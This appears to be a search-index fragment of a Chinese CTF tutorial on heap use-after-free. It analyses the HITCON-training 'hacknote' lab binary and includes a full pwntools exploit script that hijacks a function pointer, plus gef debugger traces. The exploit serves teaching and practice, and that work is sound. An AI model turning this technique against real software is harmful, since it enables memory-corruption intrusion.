./use_after_free","title":"\u539f\u7406"},{"location":"pwn/heap/use_after_free/#_2","text":"\u8fd9\u91cc\u6211\u4eec\u4ee5 HITCON-training \u4e2d\u7684 lab 10 hacknote\u4e3a\u4f8b\u3002","title":"\u4f8b\u5b50"},{"location":"pwn/heap/use_after_free/#_3","text":"\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6709\u4e2amenu\u51fd\u6570\uff0c\u5176\u4e2d\u6709 puts ( \" 1. Add note \" ); puts ( \" 2. Delete note \" ); puts ( \" 3. Print note \" ); puts ( \" 4. Exit \" ); \u6545\u800c\u7a0b\u5e8f\u5e94\u8be5\u4e3b\u8981\u67093\u4e2a\u529f\u80fd\u3002\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u6839\u636e\u7528\u6237\u7684\u8f93\u5165\u6267\u884c\u76f8\u5e94\u7684\u529f\u80fd\u3002","title":"\u529f\u80fd\u5206\u6790"},{"location":"pwn/heap/use_after_free/#add_note","text":"\u6839\u636e\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u6700\u591a\u53ef\u4ee5\u6dfb\u52a05\u4e2anote\u3002\u6bcf\u4e2anote\u6709\u4e24\u4e2a\u5b57\u6bb5put\u4e0econtent\uff0c\u5176\u4e2dput\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u4f1a\u8f93\u51fa content \u5177\u4f53\u7684\u5185\u5bb9\u3002 unsigned int add_note () { note * v0 ; // ebx signed int i ; // [esp+Ch] [ebp-1Ch] int size ; // [esp+10h] [ebp-18h] char buf ; // [esp+14h] [ebp-14h] unsigned int v5 ; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword ( 0x14u ); if ( count <= 5 ) { for ( i = 0 ; i <= 4 ; ++ i ) { if ( ! notelist [ i ] ) { notelist [ i ] = malloc ( 8u ); if ( ! notelist [ i ] ) { puts ( \"Alloca Error\" ); exit ( - 1 ); } notelist [ i ] -> put = print_note_content ; printf ( \"Note size :\" ); read ( 0 , & buf , 8u ); size = atoi ( & buf ); v0 = notelist [ i ]; v0 -> content = malloc ( size ); if ( ! notelist [ i ] -> content ) { puts ( \"Alloca Error\" ); exit ( - 1 ); } printf ( \"Content :\" ); read ( 0 , notelist [ i ] -> content , size ); puts ( \"Success !\" ); ++ count ; return __readgsdword ( 0x14u ) ^ v5 ; } } } else { puts ( \"Full\" ); } return __readgsdword ( 0x14u ) ^ v5 ; }","title":"add_note"},{"location":"pwn/heap/use_after_free/#print_note","text":"print_note\u5c31\u662f\u7b80\u5355\u7684\u6839\u636e\u7ed9\u5b9a\u7684note\u7684\u7d22\u5f15\u6765\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15\u7684note\u7684\u5185\u5bb9\u3002 unsigned int print_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) notelist [ v1 ] -> put ( notelist [ v1 ]); return __readgsdword ( 0x14u ) ^ v3 ; }","title":"print_note"},{"location":"pwn/heap/use_after_free/#delete_note","text":"delete_note \u4f1a\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\u6765\u91ca\u653e\u5bf9\u5e94\u7684note\u3002\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 \u5220\u9664\u7684\u65f6\u5019\uff0c\u53ea\u662f\u5355\u7eaf\u8fdb\u884c\u4e86free\uff0c\u800c\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u8fd9\u91cc\u662f\u5b58\u5728Use After Free\u7684\u60c5\u51b5\u7684\u3002 unsigned int del_note () { int v1 ; // [esp+4h] [ebp-14h] char buf ; // [esp+8h] [ebp-10h] unsigned int v3 ; // [esp+Ch] [ebp-Ch] v3 = __readgsdword ( 0x14u ); printf ( \"Index :\" ); read ( 0 , & buf , 4u ); v1 = atoi ( & buf ); if ( v1 < 0 || v1 >= count ) { puts ( \"Out of bound!\" ); _exit ( 0 ); } if ( notelist [ v1 ] ) { free ( notelist [ v1 ] -> content ); free ( notelist [ v1 ]); puts ( \"Success\" ); } return __readgsdword ( 0x14u ) ^ v3 ; }","title":"delete_note"},{"location":"pwn/heap/use_after_free/#_4","text":"\u6211\u4eec\u53ef\u4ee5\u770b\u5230 Use After Free \u7684\u60c5\u51b5\u786e\u5b9e\u53ef\u80fd\u4f1a\u53d1\u751f\uff0c\u90a3\u4e48\u600e\u4e48\u53ef\u4ee5\u8ba9\u5b83\u53d1\u751f\u5e76\u4e14\u8fdb\u884c\u5229\u7528\u5462\uff1f\u9700\u8981\u540c\u65f6\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\u8fd8\u6709\u4e00\u4e2amagic\u51fd\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u901a\u8fc7use after free \u6765\u4f7f\u5f97\u8fd9\u4e2a\u7a0b\u5e8f\u6267\u884cmagic\u51fd\u6570\u5462\uff1f \u4e00\u4e2a\u5f88\u76f4\u63a5\u7684\u60f3\u6cd5\u662f\u4fee\u6539note\u7684put\u5b57\u6bb5\u4e3amagic\u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u5728\u6267\u884cprint note \u7684\u65f6\u5019\u6267\u884cmagic\u51fd\u6570\u3002 \u90a3\u4e48\u8be5\u600e\u4e48\u6267\u884c\u5462\uff1f \u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u6765\u770b\u4e00\u4e0b\u6bcf\u4e00\u4e2anote\u751f\u6210\u7684\u5177\u4f53\u6d41\u7a0b \u7a0b\u5e8f\u7533\u8bf78\u5b57\u8282\u5185\u5b58\u7528\u6765\u5b58\u653enote\u4e2d\u7684put\u4ee5\u53cacontent\u6307\u9488\u3002 \u7a0b\u5e8f\u6839\u636e\u8f93\u5165\u7684size\u6765\u7533\u8bf7\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u7136\u540e\u7528\u6765\u5b58\u50a8content\u3002 +-----------------+ | put | +-----------------+ | content | size +-----------------+------------------->+----------------+ | real | | content | | | +----------------+ \u90a3\u4e48\uff0c\u6839\u636e\u6211\u4eec\u4e4b\u524d\u5728\u5806\u7684\u5b9e\u73b0\u4e2d\u6240\u5b66\u5230\u7684\uff0c\u663e\u7136note\u662f\u4e00\u4e2afastbin chunk\uff08\u5927\u5c0f\u4e3a16\u5b57\u8282\uff09\u3002\u6211\u4eec\u7684\u76ee\u7684\u662f\u5e0c\u671b\u4e00\u4e2anote\u7684put\u5b57\u6bb5\u4e3amagic\u7684\u51fd\u6570\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5fc5\u987b\u60f3\u529e\u6cd5\u8ba9\u67d0\u4e2anote\u7684put\u6307\u9488\u88ab\u8986\u76d6\u4e3amagic\u5730\u5740\u3002\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u53ea\u6709\u552f\u4e00\u7684\u5730\u65b9\u5bf9put\u8fdb\u884c\u8d4b\u503c\u3002\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u5229\u7528\u5199real content\u7684\u65f6\u5019\u6765\u8fdb\u884c\u8986\u76d6\u3002\u5177\u4f53\u91c7\u7528\u7684\u601d\u8def\u5982\u4e0b \u7533\u8bf7note0\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09 \u7533\u8bf7note1\uff0creal content size\u4e3a16\uff08\u5927\u5c0f\u4e0enote\u5927\u5c0f\u6240\u5728\u7684bin\u4e0d\u4e00\u6837\u5373\u53ef\uff09 \u91ca\u653enote0 \u91ca\u653enote1 \u6b64\u65f6\uff0c\u5927\u5c0f\u4e3a16\u7684fast bin chunk\u4e2d\u94fe\u8868\u4e3anote1->note0 \u7533\u8bf7note2\uff0c\u5e76\u4e14\u8bbe\u7f6ereal content\u7684\u5927\u5c0f\u4e3a8\uff0c\u90a3\u4e48\u6839\u636e\u5806\u7684\u5206\u914d\u89c4\u5219 note2\u5176\u5b9e\u4f1a\u5206\u914dnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u3002 real content \u5bf9\u5e94\u7684chunk\u5176\u5b9e\u662fnote0\u3002 \u5982\u679c\u6211\u4eec\u8fd9\u65f6\u5019\u5411note3\u7684chunk\u90e8\u5206\u5199\u5165magic\u7684\u5730\u5740\uff0c\u90a3\u4e48\u7531\u4e8e\u6211\u4eec\u6ca1\u6709note1\u4e3aNULL\u3002\u5f53\u6211\u4eec\u518d\u6b21\u5c1d\u8bd5\u8f93\u51fanote1\u7684\u65f6\u5019\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u8c03\u7528magic\u51fd\u6570\u3002","title":"\u5229\u7528\u5206\u6790"},{"location":"pwn/heap/use_after_free/#_5","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * r = process ( './hacknote' ) def addnote ( size , content ): r . recvuntil ( \":\" ) r . sendline ( \"1\" ) r . recvuntil ( \":\" ) r . sendline ( str ( size )) r . recvuntil ( \":\" ) r . sendline ( content ) def delnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"2\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) def printnote ( idx ): r . recvuntil ( \":\" ) r . sendline ( \"3\" ) r . recvuntil ( \":\" ) r . sendline ( str ( idx )) #gdb.attach(r) magic = 0x08048986 addnote ( 32 , \"aaaa\" ) # add note 0 addnote ( 32 , \"ddaa\" ) # add note 1 delnote ( 0 ) # delete note 0 delnote ( 1 ) # delete note 1 addnote ( 8 , p32 ( magic )) # add note 2 printnote ( 0 ) # print note 0 r . interactive () \u6211\u4eec\u53ef\u4ee5\u5177\u4f53\u770b\u4e00\u4e0b\u6267\u884c\u7684\u6d41\u7a0b\uff0c\u9996\u5148\u5148\u4e0b\u65ad\u70b9 \u4e24\u5904malloc\u4e0b\u65ad\u70b9 gef\u27a4 b *0x0804875C Breakpoint 1 at 0x804875c gef\u27a4 b *0x080486CA Breakpoint 2 at 0x80486ca \u4e24\u5904free\u4e0b\u65ad\u70b9 gef\u27a4 b *0x08048893 Breakpoint 3 at 0x8048893 gef\u27a4 b *0x080488A9 Breakpoint 4 at 0x80488a9 \u7136\u540e\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u7533\u8bf7note0\u65f6\uff0c\u6240\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5757\u5730\u5740\u4e3a0x0804b008\u3002\uff08eax\u5b58\u50a8\u51fd\u6570\u8fd4\u56de\u503c\uff09 $eax : 0x0804b008 \u2192 0x00000000 $ebx : 0x00000000 $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b008 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000008 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x080486cf \u2192 < add_note + 89 > add esp , 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 0 x80486c2 < add_note + 76 > add DWORD PTR [ eax ], eax 0 x80486c4 < add_note + 78 > add BYTE PTR [ ebx + 0x86a0cec ], al 0 x80486ca < add_note + 84 > call 0x80484e0 < malloc@plt > \u2192 0 x80486cf < add_note + 89 > add esp , 0x10 0 x80486d2 < add_note + 92 > mov edx , eax 0 x80486d4 < add_note + 94 > mov eax , DWORD PTR [ ebp-0x1c ] 0 x80486d7 < add_note + 97 > mov DWORD PTR [ eax * 4 + 0x804a070 ], edx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcf10 ' , ' l8 ' ] 8 0 xffffcf10 \u2502+ 0x00 : 0x00000008 \u2190 $esp 0 xffffcf14 \u2502+ 0x04 : 0x00000000 0 xffffcf18 \u2502+ 0x08 : 0xf7e29ef5 \u2192 < strtol + 5 > add eax , 0x18210b 0 xffffcf1c \u2502+ 0x0c : 0xf7e27260 \u2192 < atoi + 16 > add esp , 0x1c 0 xffffcf20 \u2502+ 0x10 : 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0 xffffcf24 \u2502+ 0x14 : 0x00000000 0 xffffcf28 \u2502+ 0x18 : 0x0000000a 0 xffffcf2c \u2502+ 0x1c : 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 --- Type < return > to continue , or q < return > to quit--- [ #0] 0x80486cf \u2192 Name: add_note() [ #1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 heap chunk 0x0804b008 UsedChunk ( addr = 0x804b008 , size = 0x10 ) Chunk size : 16 ( 0x10 ) Usable size : 12 ( 0xc ) Previous chunk size : 0 ( 0x0 ) PREV_INUSE flag : On IS_MMAPPED flag : Off NON_MAIN_ARENA flag : Off \u7533\u8bf7note 0\u7684content\u7684\u5730\u5740\u4e3a0x0804b018 $eax : 0x0804b018 \u2192 0x00000000 $ebx : 0x0804b008 \u2192 0x0804865b \u2192 < print_note_content + 0 > push ebp $ecx : 0xf7fac780 \u2192 0x00000000 $edx : 0x0804b018 \u2192 0x00000000 $esp : 0xffffcf10 \u2192 0x00000020 $ebp : 0xffffcf48 \u2192 0xffffcf68 \u2192 0x00000000 $esi : 0xf7fac000 \u2192 0x001b1db0 $edi : 0xf7fac000 \u2192 0x001b1db0 $eip : 0x08048761 \u2192 < add_note + 235 > add esp , 0x10 $cs : 0x00000023 $ss : 0x0000002b $ds : 0x0000002b $es : 0x0000002b $fs : 0x00000000 $gs : 0x00000063 $eflags: [ carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code: i386 ] \u2500\u2500\u2500\u2500 0 x8048752 < add_note + 220 > mov al , ds : 0x458b0804 0 x8048757 < add_note + 225 > call 0x581173df 0 x804875c < add_note + 230 > call 0x80484e0 < malloc@plt > \u2192 0 x8048761 < add_note + 235 > add esp , 0x10 0 x8048764 < add_note + 238 > mov DWORD PTR [ ebx + 0x4 ], eax 0 x8048767 < add_note + 241 > mov eax , DWORD PTR [ ebp-0x1c ] 0 x804876a < add_note + 244 > mov eax , DWORD PTR [ eax * 4 + 0x804a070 ] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcf10 ' , ' l8 ' ] 8 0 xffffcf10 \u2502+ 0x00 : 0x00000020 \u2190 $esp 0 xffffcf14 \u2502+ 0x04 : 0xffffcf34 \u2192 0xf70a3233 0 xffffcf18 \u2502+ 0x08 : 0x00000008 0 xffffcf1c \u2502+ 0x0c : 0xf7e27260 \u2192 < atoi + 16 > add esp , 0x1c 0 xffffcf20 \u2502+ 0x10 : 0xffffcf58 \u2192 0xffff0a31 \u2192 0x00000000 0 xffffcf24 \u2502+ 0x14 : 0x00000000 0 xffffcf28 \u2502+ 0x18 : 0x0000000a 0 xffffcf2c \u2502+ 0x1c : 0x00000000 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ trace ] \u2500\u2500\u2500\u2500 --- Type < return > to continue , or q < return > to quit--- [ #0] 0x8048761 \u2192 Name: add_note() [ #1] 0x8048ac5 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef \u27a4 heap chunk 0x0804b018 UsedChunk ( addr = 0x804b018 , size = 0x28 ) Chunk size : 40 ( 0x28 ) Usable size : 36 ( 0x24 ) Previous chunk size : 0 ( 0x0 ) PREV_INUSE flag : On IS_MMAPPED flag : Off NON_MAIN_ARENA flag : Off \u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230note1\u7684\u5730\u5740\u4ee5\u53ca\u5176content\u7684\u5730\u5740\u5206\u522b\u4e3a0x0804b040 \u548c0x0804b050\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u770b\u5230note0\u4e0enote1\u5bf9\u5e94\u7684content\u786e\u5b9e\u662f\u76f8\u5e94\u7684\u5185\u5b58\u5757\u3002 gef \u27a4 grep aaaa [+] Searching ' aaaa ' in memory [+] In ' [ heap ] ' ( 0x804b000 - 0x806c000 ), permission = rw- 0 x804b018 - 0x804b01c \u2192 \" aaaa \" gef \u27a4 grep ddaa [+] Searching ' ddaa ' in memory [+] In ' [ heap ] ' ( 0x804b000 - 0x806c000 ), permission = rw- 0 x804b050 - 0x804b054 \u2192 \" ddaa \" \u4e0b\u9762\u5c31\u662ffree\u7684\u8fc7\u7a0b\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u53d1\u73b0\u9996\u5148\uff0cnote0\u7684content\u88abfree \u2192 0 x8048893 < del_note + 143 > call 0x80484c0 < free@plt > \u21b3 0 x80484c0 < free@plt + 0 > jmp DWORD PTR ds : 0x804a018 0 x80484c6 < free@plt + 6 > push 0x18 0 x80484cb < free@plt + 11 > jmp 0x8048480 0 x80484d0 < __stack_chk_fail@plt + 0 > jmp DWORD PTR ds : 0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcf20 ' , ' l8 ' ] 8 0 xffffcf20 \u2502+ 0x00 : 0x0804b018 \u2192 \" aaaa \" \u2190 $esp \u7136\u540e\u662fnote0\u672c\u8eab \u2192 0 x80488a9 < del_note + 165 > call 0x80484c0 < free@plt > \u21b3 0 x80484c0 < free@plt + 0 > jmp DWORD PTR ds : 0x804a018 0 x80484c6 < free@plt + 6 > push 0x18 0 x80484cb < free@plt + 11 > jmp 0x8048480 0 x80484d0 < __stack_chk_fail@plt + 0 > jmp DWORD PTR ds : 0x804a01c \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ] \u2500\u2500\u2500\u2500 ['0 xffffcf20 ' , ' l8 ' ] 8 0 xffffcf20 \u2502+ 0x00 : 0x0804b008 \u2192 0x0804865b \u2192 < print_note_content + 0 > push ebp \u2190 $esp 